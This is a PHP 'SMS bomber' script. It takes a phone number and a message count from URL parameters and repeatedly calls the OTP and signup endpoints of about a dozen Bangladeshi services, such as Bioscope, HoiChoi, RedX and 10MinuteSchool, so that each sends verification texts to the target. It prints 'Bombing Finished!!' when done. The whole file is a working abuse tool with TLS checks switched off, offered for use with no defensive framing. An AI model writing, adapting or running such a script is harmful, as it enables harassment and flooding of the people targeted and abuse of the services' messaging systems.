<html>
<head>
<link href='https://fonts.googleapis.com/css?family=Merienda' rel='stylesheet'>
<style>
body { font-family: 'Merienda';font-size: 22px;
}
</style>
</head>
<body align="center" style="color:rgb(63,255,0); font-size:20px;">
</body>
</html>
<?php
// Get Http Request
function get_send($url) { $status = null; $headers = @get_headers($url, 1); if (is_array($headers)) { $status = substr($headers[0], 9); } return $status; }

// Get Http Request Extream
function get_ex_send($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$headr = array();
	$headr[] = 'Content-type: application/json'.$cnt;
	curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$server_output = curl_exec($ch);
	curl_close ($ch);
	return $server_output;
}

// Post Request Extream
function post_send($url, $post_data, &$http_status, &$header = null) {
    $ch=curl_init();
    // user credencial
    curl_setopt($ch, CURLOPT_USERPWD, "username:passwd");
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);

    // post_data
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

    if (!is_null($header)) {
        curl_setopt($ch, CURLOPT_HEADER, true);
    }
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json', 'Content-Type: application/json'));

    curl_setopt($ch, CURLOPT_VERBOSE, true);
    
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
      
    $body = $response;
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    //return $http_status;
    return $http_status;
}
// GET Data
 $number = $_GET["number"];
 $amount = $_GET["amount"];

// All Apis

// Bioscope 
$bios = "https://www.bioscopelive.com/en/login/send-otp?phone=88${number}&operator=bd-otp";

// HoiChoi 
$hoi = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv";
$hoidata = "{\"requestType\":\"send\", \"phoneNumber\":\"+88${number}\",\"emailConsent\":\"true\",\"whatsappConsent\":\"true\"}";

// SWAP
 $swap = 'https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${number}&countryPhoneCode=%2B88&Format=html';
 
 // RedX
 $red = substr($number, -10);
 $redx = "https://api.redx.com.bd/v1/user/signup";
 $redxdata = "{\"name\":\"${red}\", \"phoneNumber\":\"${red}\", \"service\":\"redx\"}";
 
 // 10MinutesSchool
 $ten = "https://lms.10minuteschool.com/api/v4/auth/userExists";
 $tendata = "{\"contact\" : \"+88${number}\", \"type\" : \"phone\" }";
 
 // Dhamaka
 $dhs = "https://auth.dhamakashopping.com/api/otp";
 $dhsdata = "{\"phoneNumber\":\"+88${number}\"}";
 
 // BingeBuzz
 $bing = "https://ss.binge.buzz/otp/send/login";
 $bingdata = "{\"phone\":\"${number}\"}";

 
 // QuizGIRI
 $quiznum = substr($number, -10);
 $quiz = "https://developer.quizgiri.xyz/api/v2.0/send-otp";
 $quizdata = "{\"phone\":\"${quiznum}\",\"country_code\":\"+880\",\"fcm_token\":\"null\"}";
 
 // MarketBD
 $mbd = "https://api.marketbangla.com/users/token/sign-up/";
 $mbddata = "{\"firstName\":\"Xyzha\", \"lastName\":\"Yash\",\"phone\": \"${number}\"}";
 
 // Ghuri
 $ghr = "https://ghoori.com.bd/generate_otp_no_auth";
 $ghrdata = "{\"mobileNo\":\"${number}\"}";
 
 // Bongo
 $bong = "https://api.bongo-solutions.com/auth/api/login/send-otp";
 $bongdata = "{\"operator\":\"all\", \"msisdn\": \"88${number}\"}";
 
 // SWAPP
 $swpn = "https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${number}&countryPhoneCode=%2B88&Format=html";
 
 // Bomb RUN
try{
 $done = 1;
 while ($done <= $amount){
	 $code = post_send($ten, $tendata, $http_header);
	 if ($code == 200){
	 	echo "Sent ".$done." SMS!";
 		if ($done == $amount){
 			break;
 		 }
 		$done++;
 		sleep(2);
	 }
	 $code = post_send($bios, "", $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
	  }
	 $code = get_send($swap);
	 if ($code == "200 OK"){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
	 		sleep(2);
 		}
	  }
	 $code = post_send($hoi, $hoidata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
	 }
	 $code = post_send($redx, $redxdata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = post_send($dhs, $dhsdata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = post_send($bing, $bingdata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = post_send($quiz, $quizdata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = post_send($mbd, $mbddata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = post_send($ghr, $ghrdata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = post_send($bong, $bongdata, $http_header);
	 if ($code == 200){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
	 $code = get_send($swpn);
	 if ($code == "200 OK"){
	  echo "<script>document.body.innerHTML=\"\";</script>";
	 	echo "Sent ".$done." SMS! ";
 		if ($done == $amount){
 			break;
 		}
 		else{
	 		$done++;
 			sleep(2);
 		}
		}
 }
  echo "<br><br>Bombing Finished!!";
 }catch(Exception $e){
    echo $e->getMessage();
}
?>